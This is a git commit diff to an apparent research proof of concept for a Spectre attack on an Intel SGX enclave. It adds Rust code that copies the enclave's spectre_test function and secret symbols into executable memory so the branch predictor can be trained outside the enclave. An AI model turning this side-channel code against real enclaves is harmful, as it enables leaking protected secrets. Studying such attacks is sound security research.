5c8767beebca382f22ae4063e9a48166084baa1a
Simon THOBY <git@nightmared.fr>
2021-03-03 19:03:43 +0100

    mapping the binary in memory to be able to train it outside the enclave

--- samplecode/spectre/app/src/main.rs
+++ samplecode/spectre/app/src/main.rs
@@ -15,6 +15,8 @@
 // specific language governing permissions and limitations
 // under the License..
 
+use std::num::Wrapping;
+
 extern crate sgx_types;
 extern crate sgx_urts;
 use sgx_types::*;
@@ -27,10 +29,10 @@ extern crate capstone;
 use capstone::prelude::*;
 
 extern crate nix;
-use nix::sys::mman::{mmap, MapFlags, ProtFlags};
+use nix::sys::mman::{mmap, mprotect, MapFlags, ProtFlags};
 
 extern crate libc;
-use libc::{c_void, size_t};
+use libc::c_void;
 
 static ENCLAVE_FILE: &'static str = "enclave1.signed.so";
 
@@ -63,6 +65,7 @@ fn init_enclave() -> SgxResult<SgxEnclave> {
 fn main() -> std::io::Result<()> {
     setup_measurements();
 
+    /*
     let enclave = match init_enclave() {
         Ok(r) => {
             println!("[+] Init Enclave Successful: enclave ID is {}!", r.geteid());
@@ -87,6 +90,7 @@ fn main() -> std::io::Result<()> {
     }
 
     println!("[+] Got addr 0x{:x}", addr);
+    */
 
     let cs = Capstone::new()
         .x86()
@@ -122,22 +126,27 @@ fn main() -> std::io::Result<()> {
     };
     */
 
-    let mut minidow_secret_offset = 0;
-    let mut secret_offset = 0;
+    let mut minidow_secret_sym = goblin::elf::Sym::default();
+    let mut secret_sym = goblin::elf::Sym::default();
     let mut jb_offset = 0;
     let mut jb_dst_addr = 0;
     let mut ret_offset = 0;
+    let mut spectre_test_offset = 0;
+    let mut spectre_test_size = 0;
 
     for sym in elf.syms.iter() {
         let symbol_name = elf.strtab.get(sym.st_name).unwrap().unwrap();
         if symbol_name == "MINIDOW_SECRET" {
-            minidow_secret_offset = sym.st_value;
-        }
-        if symbol_name == "SECRET" {
-            secret_offset = sym.st_value;
+            minidow_secret_sym = sym;
+        } else if symbol_name == "SECRET" {
+            secret_sym = sym;
         } else if symbol_name == "spectre_test" {
+            spectre_test_offset = sym.st_value as usize;
+            spectre_test_size = sym.st_size as usize;
+
             let asm_code =
-                &enclave_binary[sym.st_value as usize..(sym.st_value + sym.st_size) as usize];
+                &enclave_binary[spectre_test_offset..spectre_test_offset + spectre_test_size];
+
             let insns = cs
                 .disasm_all(asm_code, sym.st_value)
                 .expect("Failed to disassemble");
@@ -168,7 +177,7 @@ fn main() -> std::io::Result<()> {
     // map in memory and add a jump at the correct adress
     // see the SgxSpectre paper for more details on why we simulate only the last 32 bits of
     // addresses
-    let mut mapped_array: &[u8; 1 << 32] = unsafe {
+    let mapped_array: &mut [u8; 1 << 32] = unsafe {
         let addr = mmap(
             0 as *mut c_void,
             1 << 33,
@@ -178,17 +187,60 @@ fn main() -> std::io::Result<()> {
             0,
         )
         .unwrap();
+        println!("Mmapped 8GB of memory at {:p}", addr);
 
         std::mem::transmute((addr as usize + (1 << 32)) & (!((1 << 32) - 1)))
     };
 
     println!("Training array allocated at {:p}", mapped_array as *const _);
-    println!("secret_offset: 0x{:x}", secret_offset);
-    println!("minidow_secret_offset: 0x{:x}", minidow_secret_offset);
+
+    let spectre_test_training_fun: extern "C" fn(measurement_array_addr: u64, target_addr: u64) = unsafe {
+        let dst_addr = &mut mapped_array[spectre_test_offset] as *mut u8;
+
+        std::ptr::copy(
+            &enclave_binary[spectre_test_offset] as *const u8,
+            dst_addr,
+            spectre_test_size,
+        );
+
+        // we need to add the statics too if we want the function to work well
+        std::ptr::copy(
+            &enclave_binary[minidow_secret_sym.st_value as usize] as *const u8,
+            &mut mapped_array[minidow_secret_sym.st_value as usize] as *mut u8,
+            minidow_secret_sym.st_size as usize,
+        );
+        std::ptr::copy(
+            &enclave_binary[secret_sym.st_value as usize] as *const u8,
+            &mut mapped_array[secret_sym.st_value as usize] as *mut u8,
+            secret_sym.st_size as usize,
+        );
+
+        // I'm not sadistic enough to put the function in RWX memory.
+        println!(
+            "Mapping {} bytes as executable at {:p}",
+            spectre_test_size, dst_addr
+        );
+        mprotect(
+            // align on a page boundary
+            ((dst_addr as usize) & (!((1 << 12) - 1))) as *mut c_void,
+            spectre_test_size,
+            ProtFlags::PROT_READ | ProtFlags::PROT_EXEC,
+        )
+        .unwrap();
+
+        std::mem::transmute(dst_addr)
+    };
+
+    let target = (Wrapping(secret_sym.st_value) - Wrapping(minidow_secret_sym.st_value)).0;
+
+    // yay, training is now possible!
+    spectre_test_training_fun(unsafe { minidow::BASE_ADDR } as u64, target);
+
     println!("ret_offset: 0x{:x}", ret_offset);
     println!("jb_offset: 0x{:x}", jb_offset);
     println!("jb_dst_addr: 0x{:x}", jb_dst_addr);
 
+    /*
     let result =
         unsafe { Enclave1_spectre_test(enclave.geteid(), minidow::BASE_ADDR as u64, addr) };
     if result != sgx_status_t::SGX_SUCCESS {
@@ -201,6 +253,7 @@ fn main() -> std::io::Result<()> {
     println!("{:?}", minidow::measure_byte::<minidow::Spectre>());
 
     enclave.destroy();
+    */
 
     Ok(())
 }
